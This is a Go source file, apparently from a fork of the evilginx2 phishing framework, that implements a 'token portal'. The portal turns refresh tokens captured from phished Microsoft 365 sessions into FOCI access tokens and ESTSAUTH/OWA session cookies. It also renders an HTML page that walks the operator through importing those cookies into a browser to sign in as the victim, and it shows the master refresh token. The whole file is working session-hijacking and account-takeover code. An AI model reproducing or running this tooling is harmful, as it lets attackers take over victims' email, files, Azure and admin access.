package core

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// PortalCookie represents a browser cookie for import via StorageAce/Cookie Editor
type PortalCookie struct {
	Name           string  `json:"name"`
	Value          string  `json:"value"`
	Domain         string  `json:"domain"`
	Path           string  `json:"path"`
	Secure         bool    `json:"secure"`
	HttpOnly       bool    `json:"httpOnly"`
	HostOnly       bool    `json:"hostOnly"`
	SameSite       string  `json:"sameSite,omitempty"`
	ExpirationDate float64 `json:"expirationDate"`
	Session        bool    `json:"session"`
}

// PortalSession tracks a one-time portal link with extracted cookies and tokens
type PortalSession struct {
	Token        string
	SessionID    int
	CreatedAt    time.Time
	ExpiresAt    time.Time
	Used         bool
	Cookies      []*PortalCookie
	FOCITokens   map[string]string // Service name → access token
	RefreshToken string
	UserEmail    string
	UserName     string
}

// TokenPortal manages portal sessions for token-to-cookie conversion
type TokenPortal struct {
	db       *database.Database
	sessions map[string]*PortalSession
	mu       sync.RWMutex
}

// NewTokenPortal creates a new token portal manager
func NewTokenPortal(db *database.Database) *TokenPortal {
	return &TokenPortal{
		db:       db,
		sessions: make(map[string]*PortalSession),
	}
}

// GeneratePortalLink creates a one-time portal link for a captured session.
// It exchanges the refresh token for ESTSAUTH cookies and FOCI access tokens,
// then stores them in a portal session accessible via the generated URL token.
func (tp *TokenPortal) GeneratePortalLink(sessionID int) (string, error) {
	sessions, err := tp.db.ListSessions()
	if err != nil {
		return "", fmt.Errorf("failed to list sessions: %v", err)
	}

	var dbSession *database.Session
	for _, s := range sessions {
		if s.Id == sessionID {
			dbSession = s
			break
		}
	}
	if dbSession == nil {
		return "", fmt.Errorf("session %d not found", sessionID)
	}

	refreshToken := ""
	if dbSession.Custom != nil {
		refreshToken = dbSession.Custom["dc_refresh_token"]
	}
	if refreshToken == "" {
		return "", fmt.Errorf("session %d has no refresh token (device code tokens required)", sessionID)
	}

	// Generate cryptographically random portal token
	tokenBytes := make([]byte, 32)
	if _, err := rand.Read(tokenBytes); err != nil {
		return "", fmt.Errorf("failed to generate token: %v", err)
	}
	token := hex.EncodeToString(tokenBytes)

	log.Info("[portal] Extracting cookies and FOCI tokens for session %d...", sessionID)

	// Exchange tokens and extract cookies
	cookies, fociTokens, newRT, err := tp.ExchangeTokens(refreshToken)
	if err != nil {
		log.Warning("[portal] token exchange partially failed: %v (continuing with available data)", err)
	}

	// Persist new refresh token if one was issued
	if newRT != "" && newRT != refreshToken {
		tp.db.SetSessionCustom(dbSession.SessionId, "dc_refresh_token", newRT)
		log.Debug("[portal] updated refresh token for session %d", sessionID)
	}

	userName := ""
	userEmail := ""
	if dbSession.Custom != nil {
		userName = dbSession.Custom["dc_user_name"]
		userEmail = dbSession.Custom["dc_user_email"]
	}

	ps := &PortalSession{
		Token:        token,
		SessionID:    sessionID,
		CreatedAt:    time.Now(),
		ExpiresAt:    time.Now().Add(30 * time.Minute),
		Used:         false,
		Cookies:      cookies,
		FOCITokens:   fociTokens,
		RefreshToken: refreshToken,
		UserEmail:    userEmail,
		UserName:     userName,
	}

	tp.mu.Lock()
	tp.sessions[token] = ps
	tp.mu.Unlock()

	log.Success("[portal] Portal ready for session %d: %d cookies, %d FOCI tokens", sessionID, len(cookies), len(fociTokens))
	return token, nil
}

// GetPortalSession retrieves and validates a portal session by token
func (tp *TokenPortal) GetPortalSession(token string) (*PortalSession, error) {
	tp.mu.RLock()
	ps, ok := tp.sessions[token]
	tp.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("portal session not found or expired")
	}

	if time.Now().After(ps.ExpiresAt) {
		tp.mu.Lock()
		delete(tp.sessions, token)
		tp.mu.Unlock()
		return nil, fmt.Errorf("portal session expired")
	}

	return ps, nil
}

// MarkUsed marks a portal session as used
func (tp *TokenPortal) MarkUsed(token string) {
	tp.mu.Lock()
	if ps, ok := tp.sessions[token]; ok {
		ps.Used = true
	}
	tp.mu.Unlock()
}

// CleanupExpired removes expired portal sessions
func (tp *TokenPortal) CleanupExpired() {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	now := time.Now()
	for token, ps := range tp.sessions {
		if now.After(ps.ExpiresAt) {
			delete(tp.sessions, token)
		}
	}
}

// ExchangeTokens performs comprehensive token exchange:
// 1. Gets FOCI access tokens for multiple Microsoft services
// 2. Attempts ESTSAUTH cookie extraction via authorize flow
// 3. Attempts OWA session cookie extraction
func (tp *TokenPortal) ExchangeTokens(refreshToken string) ([]*PortalCookie, map[string]string, string, error) {
	var allCookies []*PortalCookie
	fociTokens := make(map[string]string)
	newRefreshToken := ""

	// Phase 1: Exchange for Graph API token (primary, also captures token endpoint cookies)
	log.Info("[portal] Phase 1: Graph API token exchange...")
	graphToken, rt, cookies := tp.exchangeForService(refreshToken, "https://graph.microsoft.com/.default offline_access openid profile")
	if graphToken != "" {
		fociTokens["Graph API"] = graphToken
	}
	if rt != "" {
		newRefreshToken = rt
	}
	allCookies = append(allCookies, cookies...)

	currentRT := refreshToken
	if newRefreshToken != "" {
		currentRT = newRefreshToken
	}

	// Phase 2: FOCI token exchange for multiple services
	log.Info("[portal] Phase 2: FOCI token exchange for Microsoft services...")
	services := map[string]string{
		"Outlook":    "https://outlook.office365.com/.default offline_access",
		"Office":     "https://www.office.com/.default offline_access",
		"SharePoint": "https://microsoft-my.sharepoint.com/.default offline_access",
		"Azure":      "https://management.azure.com/.default offline_access",
		"Substrate":  "https://substrate.office.com/.default offline_access",
	}

	for name, scope := range services {
		token, _, svcCookies := tp.exchangeForService(currentRT, scope)
		if token != "" {
			fociTokens[name] = token
			log.Debug("[portal] FOCI token acquired: %s", name)
		}
		allCookies = append(allCookies, svcCookies...)
	}

	// Phase 3: Attempt ESTSAUTH cookie extraction via authorize flow
	log.Info("[portal] Phase 3: ESTSAUTH cookie extraction via authorize flow...")
	estsCookies := tp.tryAuthorizeFlow(currentRT)
	allCookies = append(allCookies, estsCookies...)

	// Phase 4: Attempt OWA session establishment for Outlook cookies
	if outlookToken, ok := fociTokens["Outlook"]; ok {
		log.Info("[portal] Phase 4: OWA session establishment...")
		owaCookies := tp.tryOWASession(outlookToken)
		allCookies = append(allCookies, owaCookies...)
	}

	// Deduplicate cookies
	allCookies = deduplicateCookies(allCookies)

	log.Info("[portal] Exchange complete: %d cookies, %d FOCI tokens", len(allCookies), len(fociTokens))
	return allCookies, fociTokens, newRefreshToken, nil
}

// exchangeForService exchanges the refresh token for a service-specific access token
// and captures any cookies set by Microsoft's token endpoint
func (tp *TokenPortal) exchangeForService(refreshToken string, scope string) (accessToken string, newRT string, cookies []*PortalCookie) {
	data := url.Values{}
	data.Set("client_id", DEFAULT_REFRESH_CLIENT_ID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	req, err := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", "", nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	client := GetHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		return "", "", nil
	}
	defer resp.Body.Close()

	// Capture any cookies from the token endpoint response
	for _, c := range resp.Cookies() {
		domain := c.Domain
		if domain == "" {
			domain = ".login.microsoftonline.com"
		}
		pc := &PortalCookie{
			Name:           c.Name,
			Value:          c.Value,
			Domain:         domain,
			Path:           c.Path,
			Secure:         c.Secure,
			HttpOnly:       c.HttpOnly,
			ExpirationDate: float64(time.Now().Add(365 * 24 * time.Hour).Unix()),
		}
		if pc.Path == "" {
			pc.Path = "/"
		}
		cookies = append(cookies, pc)
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return "", "", cookies
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return "", "", cookies
	}

	return tokenResp.AccessToken, tokenResp.RefreshToken, cookies
}

// tryAuthorizeFlow attempts to capture ESTSAUTH/ESTSAUTHPERSISTENT cookies
// by calling the OAuth authorize endpoint with id_token_hint and prompt=none.
// When Microsoft STS processes this, it creates a session and sets ESTSAUTH cookies.
func (tp *TokenPortal) tryAuthorizeFlow(refreshToken string) []*PortalCookie {
	var cookies []*PortalCookie

	// Get a fresh ID token first
	data := url.Values{}
	data.Set("client_id", DEFAULT_REFRESH_CLIENT_ID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", "openid profile offline_access")

	req, _ := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	client := GetHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		log.Debug("[portal] authorize: failed to get ID token: %v", err)
		return nil
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var tokenResp TokenRefreshResponse
	json.Unmarshal(body, &tokenResp)

	if tokenResp.IDToken == "" {
		log.Debug("[portal] authorize: no ID token received, skipping authorize flow")
		return nil
	}

	// Hit the authorize endpoint with id_token_hint + prompt=none
	// This should cause Microsoft STS to set ESTSAUTH cookies
	jar, _ := cookiejar.New(nil)
	authClient := GetHttpClient()
	if _, ok := authClient.Transport.(*http.Transport); ok {
		authClient.Jar = jar
		authClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 15 {
				return http.ErrUseLastResponse
			}
			return nil
		}
	} else {
		// Fallback if transport is not *http.Transport (should not happen with GetHttpClient)
		authClient.Jar = jar
	}

	params := url.Values{}
	params.Set("response_type", "code")
	params.Set("client_id", DEFAULT_REFRESH_CLIENT_ID)
	params.Set("redirect_uri", "https://login.microsoftonline.com/common/oauth2/nativeclient")
	params.Set("scope", "openid profile offline_access")
	params.Set("id_token_hint", tokenResp.IDToken)
	params.Set("prompt", "none")
	params.Set("response_mode", "fragment")

	authURL := "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" + params.Encode()
	authReq, _ := http.NewRequest("GET", authURL, nil)
	authReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	authResp, err := authClient.Do(authReq)
	if err != nil {
		log.Debug("[portal] authorize flow request failed: %v", err)
		return nil
	}
	authResp.Body.Close()

	// Extract cookies from the cookie jar
	loginURL, _ := url.Parse("https://login.microsoftonline.com")
	for _, c := range jar.Cookies(loginURL) {
		pc := &PortalCookie{
			Name:           c.Name,
			Value:          c.Value,
			Domain:         ".login.microsoftonline.com",
			Path:           "/",
			Secure:         true,
			HttpOnly:       true,
			ExpirationDate: float64(time.Now().Add(365 * 24 * time.Hour).Unix()),
		}
		cookies = append(cookies, pc)
		log.Info("[portal] ★ Captured ESTS cookie: %s (length=%d)", c.Name, len(c.Value))
	}

	return cookies
}

// tryOWASession attempts to establish an OWA session using an Outlook-scoped access token.
// When OWA receives a valid Bearer token, it creates a session and returns session cookies.
func (tp *TokenPortal) tryOWASession(outlookToken string) []*PortalCookie {
	var cookies []*PortalCookie

	jar, _ := cookiejar.New(nil)
	client := GetHttpClient()
	if _, ok := client.Transport.(*http.Transport); ok {
		client.Jar = jar
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		}
	} else {
		client.Jar = jar
	}

	// Access OWA with Bearer token to establish a session
	req, _ := http.NewRequest("GET", "https://outlook.office365.com/owa/?exsvurl=1", nil)
	req.Header.Set("Authorization", "Bearer "+outlookToken)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		log.Debug("[portal] OWA session request failed: %v", err)
		return nil
	}
	resp.Body.Close()

	// Capture OWA cookies from jar
	owaURL, _ := url.Parse("https://outlook.office365.com")
	for _, c := range jar.Cookies(owaURL) {
		pc := &PortalCookie{
			Name:           c.Name,
			Value:          c.Value,
			Domain:         ".outlook.office365.com",
			Path:           "/",
			Secure:         true,
			HttpOnly:       true,
			ExpirationDate: float64(time.Now().Add(24 * time.Hour).Unix()),
		}
		cookies = append(cookies, pc)
		log.Info("[portal] ★ Captured OWA cookie: %s", c.Name)
	}

	// Also capture from explicit Set-Cookie headers (some may not be in jar)
	for _, sc := range resp.Header.Values("Set-Cookie") {
		parts := strings.SplitN(sc, "=", 2)
		if len(parts) == 2 {
			name := strings.TrimSpace(parts[0])
			valueParts := strings.SplitN(parts[1], ";", 2)
			value := strings.TrimSpace(valueParts[0])

			// Skip if already captured
			found := false
			for _, existing := range cookies {
				if existing.Name == name {
					found = true
					break
				}
			}
			if !found && value != "" {
				pc := &PortalCookie{
					Name:           name,
					Value:          value,
					Domain:         ".outlook.office365.com",
					Path:           "/",
					Secure:         true,
					HttpOnly:       strings.Contains(strings.ToLower(sc), "httponly"),
					ExpirationDate: float64(time.Now().Add(24 * time.Hour).Unix()),
				}
				cookies = append(cookies, pc)
			}
		}
	}

	return cookies
}

// deduplicateCookies removes duplicate cookies (same name + domain)
func deduplicateCookies(cookies []*PortalCookie) []*PortalCookie {
	seen := make(map[string]bool)
	var result []*PortalCookie
	for _, c := range cookies {
		key := c.Name + "|" + c.Domain
		if !seen[key] {
			seen[key] = true
			result = append(result, c)
		}
	}
	return result
}

// ExportSessionTokens returns the raw tokens for a session in a structured format
func (tp *TokenPortal) ExportSessionTokens(sessionID int) (map[string]string, error) {
	sessions, err := tp.db.ListSessions()
	if err != nil {
		return nil, fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.Id == sessionID {
			tokens := make(map[string]string)
			if s.Custom != nil {
				for k, v := range s.Custom {
					if strings.HasPrefix(k, "dc_") {
						tokens[k] = v
					}
				}
			}
			if len(tokens) == 0 {
				return nil, fmt.Errorf("session %d has no device code tokens", sessionID)
			}
			return tokens, nil
		}
	}
	return nil, fmt.Errorf("session %d not found", sessionID)
}

// GeneratePortalHTML builds the complete portal page HTML for a portal session.
// The page includes extracted cookies, FOCI access tokens, and step-by-step instructions
// for importing cookies into the browser to access real Microsoft 365.
func GeneratePortalHTML(ps *PortalSession) string {
	cookiesJSON, _ := json.MarshalIndent(ps.Cookies, "", "  ")
	storageAceJSON, _ := json.Marshal(ps.Cookies)

	// Build FOCI tokens section
	fociHTML := ""
	for name, token := range ps.FOCITokens {
		truncated := token
		if len(truncated) > 60 {
			truncated = truncated[:60] + "..."
		}
		fociHTML += fmt.Sprintf(`<div class="token-entry">
			<div class="token-name">%s</div>
			<div class="token-value" id="foci_%s">%s</div>
			<button class="btn btn-sm" onclick="copyText('%s','foci_%s_btn')" id="foci_%s_btn">Copy Full Token</button>
		</div>`, name, strings.ReplaceAll(name, " ", "_"), truncated,
			escapeJS(token), strings.ReplaceAll(name, " ", "_"), strings.ReplaceAll(name, " ", "_"))
	}

	userName := ps.UserName
	if userName == "" {
		userName = "Unknown"
	}
	userEmail := ps.UserEmail
	if userEmail == "" {
		userEmail = "Unknown"
	}
	cookieCount := len(ps.Cookies)
	fociCount := len(ps.FOCITokens)

	html := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session Portal - %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;line-height:1.6}
.container{max-width:1100px;margin:0 auto;padding:30px 20px}
.header{text-align:center;padding:30px 0;border-bottom:1px solid #21262d;margin-bottom:30px}
.header h1{font-size:28px;font-weight:600;color:#58a6ff;margin-bottom:8px}
.header .subtitle{color:#8b949e;font-size:14px}
.badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;margin:0 4px}
.badge-blue{background:#1f6feb33;color:#58a6ff;border:1px solid #1f6feb}
.badge-green{background:#23863633;color:#3fb950;border:1px solid #238636}
.badge-yellow{background:#9e6a0333;color:#d29922;border:1px solid #9e6a03}
.badge-red{background:#da363333;color:#f85149;border:1px solid #da3633}
.info-bar{display:flex;gap:20px;justify-content:center;padding:15px;background:#161b22;border-radius:8px;margin-bottom:25px;flex-wrap:wrap}
.info-item{display:flex;align-items:center;gap:8px;font-size:14px}
.info-item .label{color:#8b949e}
.info-item .value{color:#f0f6fc;font-weight:500}
.card{background:#161b22;border:1px solid #21262d;border-radius:8px;margin-bottom:20px;overflow:hidden}
.card-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:#1c2128;border-bottom:1px solid #21262d}
.card-title{font-size:16px;font-weight:600;color:#f0f6fc;display:flex;align-items:center;gap:8px}
.card-body{padding:20px}
.btn{padding:7px 14px;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500;display:inline-flex;align-items:center;gap:6px;transition:all .15s ease}
.btn-primary{background:#1f6feb;color:#fff}.btn-primary:hover{background:#388bfd}
.btn-success{background:#238636;color:#fff}.btn-success:hover{background:#2ea043}
.btn-sm{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.btn-sm:hover{background:#30363d;border-color:#8b949e}
.btn-danger{background:#da3633;color:#fff}.btn-danger:hover{background:#f85149}
.btn-copy-done{background:#238636!important;color:#fff!important;border-color:#238636!important}
.token-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:14px;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:12px;max-height:250px;overflow-y:auto;word-break:break-all;color:#c9d1d9;line-height:1.5;white-space:pre-wrap}
.token-entry{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:12px 16px;margin:8px 0;display:flex;align-items:center;gap:12px}
.token-name{min-width:120px;font-weight:600;color:#58a6ff;font-size:13px}
.token-value{flex:1;font-family:monospace;font-size:11px;color:#8b949e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.services{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-top:10px}
.service-link{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#21262d;border:1px solid #30363d;border-radius:8px;color:#f0f6fc;text-decoration:none;font-size:14px;transition:all .15s ease}
.service-link:hover{background:#30363d;border-color:#58a6ff;transform:translateY(-1px)}
.service-icon{font-size:20px;width:28px;text-align:center}
.steps{counter-reset:step}
.step{display:flex;align-items:flex-start;gap:14px;padding:12px 0;border-bottom:1px solid #21262d}
.step:last-child{border-bottom:none}
.step-num{counter-increment:step;width:30px;height:30px;background:#1f6feb;color:#fff;border-radius:50%%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;flex-shrink:0}
.step-num::after{content:counter(step)}
.step-text{padding-top:4px;color:#c9d1d9;font-size:14px}
.step-text a{color:#58a6ff}
.step-text code{background:#1c2128;padding:2px 6px;border-radius:3px;font-size:12px;color:#d29922}
.alert{padding:14px 18px;border-radius:8px;margin:15px 0;font-size:13px;display:flex;align-items:flex-start;gap:10px}
.alert-info{background:#0c2d6b;border:1px solid #1f6feb;color:#a5d6ff}
.alert-warn{background:#3d2e00;border:1px solid #9e6a03;color:#e3b341}
.alert-success{background:#0f2d16;border:1px solid #238636;color:#56d364}
.hidden{display:none}
.refresh-token-reveal{background:#1a0000;border:1px solid #da3633;border-radius:6px;padding:14px;margin-top:10px}
.tab-bar{display:flex;gap:0;border-bottom:2px solid #21262d;margin-bottom:15px}
.tab{padding:10px 20px;cursor:pointer;color:#8b949e;font-size:14px;border-bottom:2px solid transparent;margin-bottom:-2px;transition:all .15s ease}
.tab:hover{color:#c9d1d9}
.tab.active{color:#58a6ff;border-bottom-color:#58a6ff;font-weight:600}
.tab-content{display:none}
.tab-content.active{display:block}
::-webkit-scrollbar{width:8px}
::-webkit-scrollbar-track{background:#0d1117}
::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:#484f58}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🔑 Session Portal</h1>
<div class="subtitle">Microsoft 365 Token-to-Cookie Conversion | Session #%d</div>
</div>

<div class="info-bar">
<div class="info-item"><span class="label">User:</span><span class="value">%s</span></div>
<div class="info-item"><span class="label">Email:</span><span class="value">%s</span></div>
<div class="info-item"><span class="badge badge-green">%d Cookies</span></div>
<div class="info-item"><span class="badge badge-blue">%d FOCI Tokens</span></div>
<div class="info-item"><span class="badge badge-yellow">Expires: %s</span></div>
</div>

<!-- Quick Access Links -->
<div class="card">
<div class="card-header">
<div class="card-title">🚀 Quick Access (after cookie import)</div>
</div>
<div class="card-body">
<div class="services">
<a href="https://outlook.office365.com/mail/" target="_blank" class="service-link"><span class="service-icon">📧</span>Outlook Mail</a>
<a href="https://outlook.office365.com/calendar/" target="_blank" class="service-link"><span class="service-icon">📅</span>Calendar</a>
<a href="https://onedrive.live.com/" target="_blank" class="service-link"><span class="service-icon">☁️</span>OneDrive</a>
<a href="https://teams.microsoft.com/" target="_blank" class="service-link"><span class="service-icon">💬</span>Teams</a>
<a href="https://www.office.com/" target="_blank" class="service-link"><span class="service-icon">🏢</span>Office Portal</a>
<a href="https://myaccount.microsoft.com/" target="_blank" class="service-link"><span class="service-icon">👤</span>My Account</a>
<a href="https://portal.azure.com/" target="_blank" class="service-link"><span class="service-icon">⚡</span>Azure Portal</a>
<a href="https://admin.microsoft.com/" target="_blank" class="service-link"><span class="service-icon">⚙️</span>Admin Center</a>
</div>
</div>
</div>

<!-- Cookies Section -->
<div class="card">
<div class="card-header">
<div class="card-title">🍪 Extracted Cookies (%d)</div>
<div>
<button class="btn btn-success" onclick="copyCookies('storageace')" id="btn_storageace">📋 Copy for StorageAce</button>
<button class="btn btn-primary" onclick="copyCookies('pretty')" id="btn_pretty" style="margin-left:6px">📋 Copy JSON</button>
</div>
</div>
<div class="card-body">
<div class="alert alert-info">
<span>ℹ️</span>
<span>These cookies were extracted from Microsoft's authentication servers using the captured refresh token. Import them into your browser using <strong>StorageAce</strong> or <strong>Cookie Editor</strong> extension, then navigate to any Microsoft 365 service.</span>
</div>
<div class="tab-bar">
<div class="tab active" onclick="switchTab('cookies','storageace')">StorageAce Format</div>
<div class="tab" onclick="switchTab('cookies','pretty')">Pretty JSON</div>
<div class="tab" onclick="switchTab('cookies','list')">Cookie List</div>
</div>
<div id="cookies_storageace" class="tab-content active">
<div class="token-box" id="storageace_json">%s</div>
</div>
<div id="cookies_pretty" class="tab-content">
<div class="token-box" id="pretty_json">%s</div>
</div>
<div id="cookies_list" class="tab-content">
<div id="cookie_list_items">%s</div>
</div>
</div>
</div>

<!-- FOCI Access Tokens -->
<div class="card">
<div class="card-header">
<div class="card-title">🎟️ FOCI Access Tokens (%d)</div>
<button class="btn btn-sm" onclick="toggleSection('foci_body')">Toggle</button>
</div>
<div class="card-body" id="foci_body">
<div class="alert alert-info">
<span>ℹ️</span>
<span>Family of Client IDs (FOCI) tokens grant access to multiple Microsoft services from a single refresh token. Use these as <code>Authorization: Bearer &lt;token&gt;</code> headers for direct API access.</span>
</div>
%s
</div>
</div>

<!-- Refresh Token (hidden by default) -->
<div class="card">
<div class="card-header">
<div class="card-title">🔐 Refresh Token</div>
<button class="btn btn-danger" onclick="toggleSection('rt_body')" id="rt_toggle">⚠️ Reveal</button>
</div>
<div class="card-body hidden" id="rt_body">
<div class="alert alert-warn">
<span>⚠️</span>
<span>This is the master refresh token. With this token, you can generate new access tokens for ANY Microsoft service. Keep it secret. Use it with: <code>roadtx auth --refresh-token &lt;token&gt;</code> or the mailbox viewer.</span>
</div>
<div class="token-box" id="rt_value">%s</div>
<button class="btn btn-sm" onclick="copyText(document.getElementById('rt_value').textContent,'rt_copy')" id="rt_copy" style="margin-top:10px">📋 Copy Refresh Token</button>
</div>
</div>

<!-- Instructions -->
<div class="card">
<div class="card-header">
<div class="card-title">📖 How to Sign In to Real Microsoft 365</div>
</div>
<div class="card-body">
<div class="steps">
<div class="step"><div class="step-num"></div><div class="step-text">Install <a href="https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo" target="_blank">StorageAce</a> Chrome extension (or <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" target="_blank">Cookie Editor</a>)</div></div>
<div class="step"><div class="step-num"></div><div class="step-text">Navigate to <a href="https://login.microsoftonline.com" target="_blank">login.microsoftonline.com</a> in your browser</div></div>
<div class="step"><div class="step-num"></div><div class="step-text">Click the <strong>StorageAce</strong> extension icon → <strong>Cookies</strong> tab → <strong>Import</strong> button</div></div>
<div class="step"><div class="step-num"></div><div class="step-text">Click the <strong>"Copy for StorageAce"</strong> button above, then paste into the import dialog</div></div>
<div class="step"><div class="step-num"></div><div class="step-text">Refresh the page — you should now be signed in as <strong>%s</strong></div></div>
<div class="step"><div class="step-num"></div><div class="step-text">Navigate to any Microsoft 365 service: <a href="https://outlook.office365.com" target="_blank">Outlook</a>, <a href="https://onedrive.live.com" target="_blank">OneDrive</a>, <a href="https://teams.microsoft.com" target="_blank">Teams</a>, etc.</div></div>
</div>

<div class="alert alert-warn" style="margin-top:15px">
<span>⚠️</span>
<span><strong>If cookies alone don't work</strong>, use the <strong>Refresh Token</strong> approach: Copy the refresh token → use <code>roadtx</code> or Python to exchange it for service-specific tokens → call APIs directly. The mailbox viewer (<code>mailbox.html</code>) already handles this automatically.</span>
</div>
</div>
</div>

</div>

<script>
function switchTab(group, tab) {
	document.querySelectorAll('#cookies_storageace,#cookies_pretty,#cookies_list').forEach(el => el.classList.remove('active'));
	document.querySelectorAll('.tab-bar .tab').forEach(el => el.classList.remove('active'));
	document.getElementById(group + '_' + tab).classList.add('active');
	event.target.classList.add('active');
}
function toggleSection(id) {
	var el = document.getElementById(id);
	el.classList.toggle('hidden');
}
function copyText(text, btnId) {
	navigator.clipboard.writeText(text).then(function() {
		var btn = document.getElementById(btnId);
		var orig = btn.textContent;
		btn.textContent = '✅ Copied!';
		btn.classList.add('btn-copy-done');
		setTimeout(function() { btn.textContent = orig; btn.classList.remove('btn-copy-done'); }, 2000);
	});
}
function copyCookies(format) {
	var text = '';
	var btnId = 'btn_' + format;
	if (format === 'storageace') {
		text = document.getElementById('storageace_json').textContent;
	} else {
		text = document.getElementById('pretty_json').textContent;
	}
	copyText(text, btnId);
}

// Store full FOCI tokens for copy
var fociTokens = %s;
</script>
</body>
</html>`,
		escapeHTML(userName),
		ps.SessionID,
		escapeHTML(userName),
		escapeHTML(userEmail),
		cookieCount,
		fociCount,
		ps.ExpiresAt.Format("15:04:05 MST"),
		cookieCount,
		string(storageAceJSON),
		string(cookiesJSON),
		generateCookieListHTML(ps.Cookies),
		fociCount,
		fociHTML,
		escapeHTML(ps.RefreshToken),
		escapeHTML(userEmail),
		generateFOCITokensJS(ps.FOCITokens),
	)

	return html
}

// generateCookieListHTML creates a visual list of cookies
func generateCookieListHTML(cookies []*PortalCookie) string {
	if len(cookies) == 0 {
		return `<div class="alert alert-warn"><span>⚠️</span><span>No cookies were extracted. This may happen if Microsoft's token endpoint did not set session cookies. Use the <strong>Refresh Token</strong> approach instead.</span></div>`
	}
	var sb strings.Builder
	for _, c := range cookies {
		truncVal := c.Value
		if len(truncVal) > 80 {
			truncVal = truncVal[:80] + "..."
		}
		sb.WriteString(fmt.Sprintf(`<div class="token-entry">
			<div class="token-name" style="min-width:200px">%s<br><span style="font-size:10px;color:#8b949e">%s</span></div>
			<div class="token-value">%s</div>
		</div>`, escapeHTML(c.Name), escapeHTML(c.Domain), escapeHTML(truncVal)))
	}
	return sb.String()
}

// generateFOCITokensJS creates a JS object of FOCI tokens for clipboard copy
func generateFOCITokensJS(tokens map[string]string) string {
	j, _ := json.Marshal(tokens)
	return string(j)
}

// escapeHTML prevents XSS in generated HTML
func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&#39;")
	return s
}

// escapeJS escapes a string for safe inclusion in JavaScript
func escapeJS(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "'", "\\'")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	return s
}
